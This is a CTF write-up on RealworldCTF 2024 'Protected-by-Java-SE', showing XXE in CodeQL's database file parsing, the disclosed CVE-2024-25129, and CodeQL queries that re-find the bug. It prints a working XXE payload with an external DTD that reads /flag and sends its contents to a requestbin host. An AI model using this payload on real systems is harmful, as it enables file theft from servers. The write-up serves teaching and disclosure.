---
layout: isl-research-post
title: "RealworldCTF 2024 – Protected-by-Java-SE – Writeup"
excerpt: "How to find XXE in CodeQL using CodeQL – unintended CTF challenge solution."
---

# RealworldCTF 2024 – Protected-by-Java-SE – Writeup

_TLDR: Nearly up-to-date (at the time) version of CodeQL and we have to extract the contents of a world-readable /flag file using XXE._ \
400 points and 8 solves. \
Flag: `rwctf{6ebfdb11-8e7f-493a-8bb2-d8623fd993bf}`.

<div class="note">
<b>Note:</b>
The unintended solution and vuln has been found without CodeQL, but it was just too intriguing to not say "using CodeQL to find bugs in CodeQL" in the title and so I also show how to find the vuln using CodeQL.
</div>

For this challenge, we are given an executable `codeql_agent` and a `Dockerfile` that downloads the CodeQL bundle version 2.15.5.
Our only means of interaction with the remote system is through this agent, written in Rust. Using this binary, a git repository containing a CodeQL database can be cloned and then we are allowed to execute (multiple) arbitrary CodeQL queries against it.

To obtain the flag file, we therefore have to find a (probably arbitrary) file read in CodeQL, which either emits the file contents to stdout/stderr or sends them off to a remote host.

I'll first show the intended solution, my unintended solution, and then how to find the vulnerability using CodeQL.

<div class="note" markdown="span">
<b>Note:</b>
The analysis was done together with [I Al Istannen](https://github.com/I-Al-Istannen) while the part on using CodeQL to (re-)find the XXE was done by me. So "I" often means "we" in the first part.
</div>

## Analysis

If we open the binary in Ghidra, we are greeted with (Rust) pain:
<img src="/assets/images/realworldctf-2024_rust_pain.png" alt="Unreadable decompiled Rust code" style="width: 100%;"/>

So maybe let's just run it and see what it does.
After starting the driver program we are first asked for our username.
Unfortunately, we cannot introduce any special characters into it and so this is not (unintentionally) exploitable.
After that, we can ask the program to clone a given URL using `git clone`.
So far, no reversing was actually needed, but as we were initially unable to clone a git repository we had to look at the Rust code...
Trying to follow the flow from the entry point is pretty hard due to Rust and the usage of tokio. Instead we simply searched in Ghidra for the error string:

> Invalid Git URL. Please try again.

Which brings us here:
<img src="/assets/images/realworldctf-2024_invalid_git_url_string.png" alt="The string 'Invalid Git URL. Please try again.\n' as shown in Ghidra's listing view" style="width: 100%;"/>

And after clicking on the first XREF, we get this nice code:
<img src="/assets/images/realworldctf-2024_invalid_git_url_string_used.png" alt="The string is being used inside an if" style="width: 100%;"/>

The code checks whether the url has at least 8 characters and starts with `http://`. The starts with check is implemented by XORing with `0x2f2f3a70` (which is equivalent to `//:p`) and `0x70747468` (which is equivalent to `ptth`).

So a valid url would for example be http://internal.internal/foo.git.

After that, we can write arbitray CodeQL which is then executed as a query.
By either looking at the strings in Ghidra or by observing the started programs, we realize that CodeQL is started in a slightly unusual way:
`codeql query run -d <DB_PATH> <QUERY_PATH> -J-Djavax.xml.accessExternalDTD=all`
The JVM option `-Djavax.xml.accessExternalDTD=all` immediately hints towards the next step being to look at XML/XXE.

<!-- ### Debugging CodeQL

TODO: port section from writeup -->

## Intended Solution

The intended solution is to perform XXE using the legacy `.dbinfo` file which is used by CodeQL to store information about the database and looks like this:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns2:dbinfo xmlns:ns2="https://semmle.com/schemas/dbinfo">
    <sourceLocationPrefix>/opt/src</sourceLocationPrefix>
    <unicodeNewlines>false</unicodeNewlines>
    <columnKind>utf16</columnKind>
</ns2:dbinfo>
```

CodeQL parses `.dbinfo` files using the `com.semmle.util.db.DbInfo` class which uses their `XML` class to parse the XML file:

```java
// simplified from `readXmlDbInfo`
String dbInfoPath = "PATH/TO/.dbinfo";
InputStream input = Files.newInputStream(dbInfoPath);
DbInfo dbInfo = XML.read(null, DbInfo.class, dbInfoPath.toString(), new StreamSource(input));
```

`XML.read` ultimately uses `javax.xml.bind.Unmarshaller` to parse the XML file:

```java
public static <T> T read(Schema schema, Class<T> type, String sourceName, StreamSource source) {
Unmarshaller unmarshaller = getContext(type).createUnmarshaller();
unmarshaller.setSchema(schema);
return unmarshaller.unmarshal(source, type).getValue();
}
```

The `javax.xml.bind.Unmarshaller` class is part of the Java API for XML Binding (JAXB) which is not vulnerable to XXE by default in newer versions [^name-hint] as far as I know. So if we run this simplified code that uses `javax.xml.bind.Unmarshaller` to parse an XML file with XXE, it will not work:

```java
public class Main {
    public static void main(String[] args) throws Exception {
        String xxeString = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag\">]><foo>&xxe;</foo>";
        InputStream input = new ByteArrayInputStream(xxeString.getBytes("UTF-8"));
        JAXBContext context = JAXBContext.newInstance(String.class);
        Unmarshaller unmarshaller = context.createUnmarshaller();
        System.out.println(unmarshaller.unmarshal(new StreamSource(input), String.class).getValue());
    }
}
```

and fail with an exception:

```
javax.xml.bind.UnmarshalException
    at [SNIP]
Caused by: org.xml.sax.SAXParseException: External Entity: Failed to read external document 'flag', because 'file' access is not allowed due to restriction set by the accessExternalDTD property.
    at [SNIP]
    at com.example.Main.main (Main.java:18)
```

[^name-hint]:
    That's probably the reason why this challenge is called "Protected-by-Java-SE":
    `javax.xml.accessExternalDTD=all` is NOT set to `all` by default in newer versions of Java and therefore this is "protected" by Java SE.

If we run the same code with the `-Djavax.xml.accessExternalDTD=all` JVM option, it will work and print the contents of the `/flag` file:

```
rwctf{fake_flag}
```

### Full Exploit

For a full exploit, we'd replace a `.dbinfo` file in an existing (old) CodeQL database with this XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foobar SYSTEM "https://requestbin.internal/dQw4w9WgXcQ">
```

where the `https://requestbin.internal/dQw4w9WgXcQ` URL is a requestbin URL that we control and that returns this content:

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://requestbin.internal/dQw4w9WgXc/%file;'>">
%eval;
%exfil;
```

We then only have to host the DB somewhere in a Git repository and tell the "codeql_agent" to run a CodeQL query on that database.

After a while, we will see a request to our requestbin URL with the contents of the `/flag` file:
`https://requestbin.internal/dQw4w9WgXc/rwctf{6ebfdb11-8e7f-493a-8bb2-d8623fd993bf}`

## Unintended Solution – CVE-2024-25129

The unintended solution is to use the `semmlecode.dbscheme.stats` file which is used to improve join-ordering decisions in CodeQL. This solution is unintended, because it works with the default JVM settings and does not require the `-Djavax.xml.accessExternalDTD=all` JVM option. We therefore responsibly disclosed this vulnerability to GitHub and it was assigned [CVE-2024-25129](https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gf8p-v3g3-3wph).

### Finding out Where XML is Parsed

We knew that we had to find a place where CodeQL parsed XML and so we set out to find all places where the CodeQL Java program parsed XML. To do this, we first set up a comfy development environment.

#### Debugging

As CodeQL is a nice, unobfuscated Java program, we just make a small project in IntelliJ and attach the CodeQL jar file as a library. This allows us to write code calling CodeQL methods but, more importantly, also **to use IntelliJs remote debugging feature for dynamic analysis**. To find all XML parsing locations, we then insert breakpoints at the JAXP entrypoints and run the program.

#### JAXP

Very soon a few breakpoints triggered — parsing the logback configuration included in the CodeQL jar file. Not exactly a prime target. Sadly, this was all we could gather at this stage, no other places jump out that parse XML using the JAXP entrypoints. But we also noticed another place parsing XML, even though it did not seem to hit the normal JAXB methods: The database statistics file (this file is used to improve join-ordering decisions). Unfortunately, it seems to be loaded from the integrated definitions within CodeQL and therefore not controllable by us.

#### dbstats

Through trial and error, we finally move a dbstats file (`db-java/semmlecode.dbscheme.stats`) in the database, changing its path and suddenly running a query crashes with a file-not-found exception. Tracing the callstack with the provided error message reveals a _second_ XML parser, Apache Xerces (this is Java after all)! After experimenting for a bit, we confirm that the XML in the statistics file is actually parsed by CodeQL (using the `StatisticsPersistence` class) — XML written by us.

### Exploitation

We can now just reuse the XXE payload from the [intended solution](#full-exploit) and host the dbstats file in a Git repository. After running a query, we will once again see a request to our requestbin URL with the contents of the `/flag` file.

**In real life, this vulnerability is unfortunately quite limited as (at least) Java does not allow newlines in URLs, making exfiltration of multi-line files impossible.** \
However, XXE can still be used for RCE when the stars align as the watchTowr team has shown in their recent [blog post](https://labs.watchtowr.com/sysowned-your-friendly-rce-support-ticket/).

## Using CodeQL to Find XXE in CodeQL

The GitHub security advisory for the unintended solution interestingly states this:

> [https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-611/XXELocal.ql](https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-611/XXELocal.ql) is a CodeQL query that _would have_ found this vulnerability. It is usually disabled because a high risk of false positives. Java projects that know they will never need to parse XML that depends on document-provided DTDs may want to enable it in their own CodeQL analysis.

So let's try this and see if we can find the XXE in CodeQL using CodeQL.
(Spoiler alert: it's not that easy)

If you click on the link in the advisory, you'll be greeted with a 404 [^commit_that_removes_it]. This is because CodeQL recently introduced **Threat Models**.

[^commit_that_removes_it]: The commit that removes the XXELocal.ql query is [here](https://github.com/github/codeql/commit/93988e5834ba51739287a9d0f390be473fcaea70).

### Threat Models

[**Threat Models**](https://github.blog/changelog/2023-12-20-code-scanning-is-now-more-adaptable-to-your-codebase-with-codeql-threat-model-settings-for-java-beta/) are a new way to tell CodeQL our well - threat model. Is our code accessible to local attackers that might be able to write files to our disk? Or is it accessible to remote attackers?
In essence, Threat Models tell CodeQL what we **do care** about and what we **don't care** about. This is important because CodeQL is a general-purpose tool and can be used for many different things. For example, if we are analyzing a web application, we might not care about local attacks at all and only want to find remote attacks.

So instead of having one query that finds local XXE and one that finds remote XXE, we now have a single query that finds XXE and we tell CodeQL whether we care about local or remote attacks.

### Creating a CodeQL Database from Decompiled Code – Buildless Mode

We had to decompile the CodeQL jar file to get the source code when we were trying to find a solution to the challenge. Now we can use this decompiled source code to create a CodeQL database and analyze it.

Luckily for us, CodeQL recently added a new feature called [**Buildless Mode**](https://github.blog/changelog/2024-03-26-codeql-can-scan-java-projects-without-a-build/) which allows us to create a CodeQL database from source code without being able to build the project. This is especially useful for decompiled code where we might not have all the dependencies.

We can use the following command to create a CodeQL database from the decompiled CodeQL source code:

```bash
codeql database create --language=java ../codeql_db --build-mode=none
```

### Running the XXE Query – Failure

Now that we have a CodeQL database, we can run the XXE query on it like this:

```bash
codeql database analyze PATH_TO_DB PATH_TO_ql/java/ql/src/Security/CWE/CWE-611/XXE.ql --threat-model local --output=output.sarif --format=sarif-latest  --rerun
```

The query will find only one result in the CodeQL source code:
The `StAXXmlPopulator.java` file which is a false-positive, because all entities are only resolved to dummy values.

So where is the XXE in the `StatisticsPersistence` class?

### Running the XXE Query – Debugging

The `XXE.ql` query looks like this:

```ql
import java
import semmle.code.java.dataflow.DataFlow
import semmle.code.java.security.XxeRemoteQuery
import XxeFlow::PathGraph

from XxeFlow::PathNode source, XxeFlow::PathNode sink
where XxeFlow::flowPath(source, sink)
select sink.getNode(), source, sink,
  "XML parsing depends on a $@ without guarding against external entity expansion.",
  source.getNode(), "user-provided value"
```

If we want to debug this, we have to make a few changes:

1. Add a new module `module XxeFlowPartial = XxeFlow::FlowExplorationRev<explorationLimit/0>;` for performing reverse data flow analysis.
2. Define a function `int explorationLimit() { result = 3; }` for limiting the exploration depth to 3.
3. Change the `flowPath` predicate to `XxeFlowPartial::partialFlow(source, sink, _)`
4. Change the `XxeFlow::PathGraph` to `XxeFlowPartial::PartialPathGraph`.
5. Change the `XxeFlow::PathNode` to `XxeFlowPartial::PartialPathNode`.
6. Add an additional constraint to the `flowPath` predicate to only match the `StatisticsPersistence` class: `sink.getLocation().getFile().getAbsolutePath().matches("%StatisticsPersistence%")`

If we now run the modified query and tweak the exploration limit a bit, we can see that the `StatisticsPersistence` class is not reachable from a source node.
This is because only a few classes are currently modeled for the `file` (included in `local`) threat model.

Crucially, the `java.nio.file.Files.newBufferedReader` method is not modeled at all.

### Running the XXE Query – Success

If we go to our checkout of `ql/java/ql/lib/ext/java.nio.file.model.yml` and add the following lines:

```yaml
- addsTo:
    pack: codeql/java-all
    extensible: sourceModel
  data:
    - [
        "java.nio.file",
        "Files",
        True,
        "newBufferedReader",
        "",
        "",
        "ReturnValue",
        "file",
        "manual",
      ]
```

and run the original query again, we can now see the `StatisticsPersistence` class in the results:
<img src="/assets/images/realworldctf-2024_codeql_statistics_persistence.png" alt="XXE in CodeQL" style="width: 100%;"/>

This is exactly the flow that we used in the unintended solution.

If we were to run the same query on the patched version of CodeQL, we would see that the `StatisticsPersistence` class is not vulnerable anymore, because the XML parser is now configured to not allow external entities.

## Conclusion

In this writeup, we have shown how to solve the RealworldCTF 2024 challenge "Protected-by-Java-SE" using XXE in CodeQL both the intended and unintended way.

We also showed how to find the XXE vulnerability in CodeQL using CodeQL itself :D \
For that, we used [**Buildless Mode**](https://github.blog/changelog/2024-03-26-codeql-can-scan-java-projects-without-a-build/) to work with decompiled code, used the new [**Threat Models**](https://github.blog/changelog/2023-12-20-code-scanning-is-now-more-adaptable-to-your-codebase-with-codeql-threat-model-settings-for-java-beta/) feature, and looked at how to debug a dataflow query using [**partial forward/reverse dataflow**](https://codeql.github.com/docs/writing-codeql-queries/debugging-data-flow-queries-using-partial-flow/) analysis.

Ultimately, this challenge shows that even well-designed security software can still be vulnerable.
